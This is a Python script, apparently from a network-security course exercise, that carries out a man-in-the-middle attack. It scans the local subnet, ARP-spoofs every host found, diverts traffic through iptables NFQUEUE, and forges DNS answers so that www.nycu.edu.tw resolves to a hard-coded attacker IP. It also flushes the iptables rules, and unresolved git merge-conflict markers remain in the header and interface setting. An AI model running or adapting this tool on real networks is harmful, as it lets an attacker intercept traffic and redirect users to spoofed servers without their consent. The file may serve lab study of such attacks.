<<<<<<< HEAD
#!/usr/bin/env python3
=======
#!/usr/bin/env python
>>>>>>> 735d269aa943aff13660cf3245fc54373370c3ae
import os
import socket
import time
import struct
from fcntl import ioctl
import scapy.all as scapy
from threading import Timer
import netfilterqueue


IP_MAC = []
<<<<<<< HEAD
interface_name = "ens33"
=======
interface_name = "enp0s6"
>>>>>>> 735d269aa943aff13660cf3245fc54373370c3ae
my_MAC = ""
my_IP = ""
SIOCGIFADDR = 0x8915
target_name = b'www.nycu.edu.tw'
attacker_ip = b'140.113.207.241'
QUEUE_NUM = 0

def get_my_MAC():
    global my_MAC, interface_name
    f = open('/sys/class/net/' + interface_name + '/address')
    my_MAC = f.read().strip()
    print("my MAC:", my_MAC)
def get_my_IP():
    global my_IP, interface_name
    s = socket.socket(socket.SOCK_DGRAM)
    raw_ip = ioctl(s.fileno(), SIOCGIFADDR, struct.pack('64s', interface_name.encode("utf-8")))[20:24]
    my_IP = socket.inet_ntoa(raw_ip)
    print("my IP", my_IP)

def sort_IP_MAC(entry):
    return socket.inet_aton(entry[0])
def collect_IP_MAC_info():
    global IP_MAC, my_IP
    ip_slice = my_IP.split('.')
    os.system("nmap -sP  {}.{}.{}.1-254 > /dev/null".format(ip_slice[0], ip_slice[1], ip_slice[2]))
    from_child = os.popen("arp -a").read()
    records = from_child.split()
    print("Available devices")
    print('-'*40)
    print("IP\t\t\tMAC")
    print('-'*40)

    tmp = ""
    for record in records:
        # IP addr
        if len(record.split('.')) == 4:
            tmp = record[1:-1]
        # MAC addr
        if len(record.split(':')) == 6 and len(tmp) > 0:
            IP_MAC.append([tmp,record])
            tmp = ""
    IP_MAC.sort(key=sort_IP_MAC)
    for entry in IP_MAC:
        print(entry[0], end="\t\t")
        print(entry[1], end='\n')

def ARP_spoofing():
    # get ARP request
    global my_IP, my_MAC
    for IP, MAC in IP_MAC:
        for other_IP, other_MAC in IP_MAC:
            if other_IP == IP and other_MAC == MAC: continue
            arp = scapy.ARP(op=2, pdst=IP, hwdst=MAC, psrc=other_IP, hwsrc=my_MAC)
            scapy.send(arp, verbose=False) # verbose=False -> disable packet sent notification

def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #print(scapy_packet.haslayer)
    #print(scapy.DNSRR)
    #print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.DNSRR):
        #print('enter')
        #print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        print(qname)
        if b'www.nycu.edu.tw' in qname:
            print("Spoofing......")
            spoof = scapy.DNSRR(rrname=qname, rdata=attacker_ip)
            scapy_packet[scapy.DNS].an = spoof
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    ##print('accept!!')

# get_my_MAC()
# get_my_IP()
# collect_IP_MAC_info()
# while True: 
#     ARP_spoofing()

os.system('iptables -t nat -F')
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

#os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num {}'.format(QUEUE_NUM))
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

# instantiate the netfilter queue
queue = netfilterqueue.NetfilterQueue()
try:
# bind the queue number to our callback `process_packet` and start it
    queue.bind(QUEUE_NUM, process_packets)
    print('b run')
    queue.run()
    print('there')
except KeyboardInterrupt:
# if want to exit, make sure we remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
    print('key fluse')
finally:
    os.system("iptables --flush")
    print('flush end')

    